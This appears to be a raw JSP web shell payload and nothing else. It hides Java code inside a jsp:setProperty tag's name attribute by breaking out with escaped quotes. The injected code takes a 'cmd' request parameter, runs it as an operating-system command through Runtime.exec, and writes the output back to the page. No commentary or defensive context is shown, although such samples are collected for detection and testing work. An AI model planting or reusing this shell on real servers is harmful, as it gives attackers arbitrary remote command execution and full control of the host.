<jsp:directive.page  import="java.util.*,java.io.*" />
<jsp:useBean id="test" class="java.lang.Object"/>
<jsp:setProperty name="test\"), request);
  if (request.getParameter(\"cmd\") != null) {

        Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }

//" property="*"/>